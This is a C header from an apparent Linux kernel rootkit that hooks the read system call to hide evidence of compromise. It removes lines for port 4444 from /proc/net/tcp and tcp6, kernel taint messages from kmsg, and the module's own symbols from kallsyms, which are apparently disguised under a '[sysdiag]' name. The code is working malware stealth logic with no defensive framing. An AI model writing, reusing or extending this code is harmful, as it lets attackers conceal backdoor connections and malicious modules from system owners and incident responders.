#ifndef _READ_H_
#define _READ_H_

#include <linux/file.h>

#define HIDE_PORT 4444

static char portstr[8];

static asmlinkage long (*og_read)(unsigned int fd, char __user *buf,
                                  size_t count);

/* bounded search — lines are not null-terminated, so no strstr */
static bool line_contains(const char *hay, size_t hlen, const char *needle)
{
    size_t n = strlen(needle);

    if (!n || hlen < n)
        return false;

    for (; hlen >= n; hay++, hlen--)
        if (!memcmp(hay, needle, n))
            return true;

    return false;
}

/* erase every line containing any needle; returns new length */
static long drop_lines(char *buf, long ret, const char **needles, int n)
{
    char *line = buf;
    char *end  = buf + ret;
    int i;

    while (line < end) {
        char *next = memchr(line, '\n', end - line);
        size_t len = next ? (size_t)(next - line + 1)
                          : (size_t)(end - line);
        bool drop = false;

        for (i = 0; i < n; i++)
            if (line_contains(line, len, needles[i])) {
                drop = true;
                break;
            }

        if (drop) {
            ret -= len;
            end -= len;
            memmove(line, line + len, end - line);
        } else {
            line += len;
        }
    }

    return ret;
}

/* copy user buffer in, filter, copy shrunk result back */
static long filter_user_buf(char __user *buf, long ret,
                            const char **needles, int n)
{
    char *kbuf;

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;
    }

    ret = drop_lines(kbuf, ret, needles, n);
    copy_to_user(buf, kbuf, ret);
    kfree(kbuf);
    return ret;
}

static asmlinkage long hooked_read(unsigned int fd, char __user *buf,
                                   size_t count)
{
    static const char *tcp_n[]  = { portstr };
    static const char *kmsg_n[] = { PREFIX, "taint" };
    static const char *ksym_n[] = { PREFIX };

    long ret = og_read(fd, buf, count);
    struct file *file;
    const char *name;

    if (ret <= 0)
        return ret;

    file = fget(fd);
    if (!file)
        return ret;

    name = file->f_path.dentry->d_name.name;

    if (strcmp(name, "tcp") == 0 || strcmp(name, "tcp6") == 0) {
        fput(file);
        return filter_user_buf(buf, ret, tcp_n, 1);   /* hide :115C lines */
    }

    if (strcmp(name, "kmsg") == 0) {
        fput(file);
        return filter_user_buf(buf, ret, kmsg_n, 2);  /* hide taint lines */
    }

    if (strcmp(name, "kallsyms") == 0) {
        fput(file);
        return filter_user_buf(buf, ret, ksym_n, 1);  /* hide [sysdiag] symbols */
    }

    fput(file);
    return ret;
}

/* call once from init, BEFORE hooks install */
static void hide_conn_init(void)
{
    snprintf(portstr, sizeof(portstr), ":%04X", HIDE_PORT);
}

#endif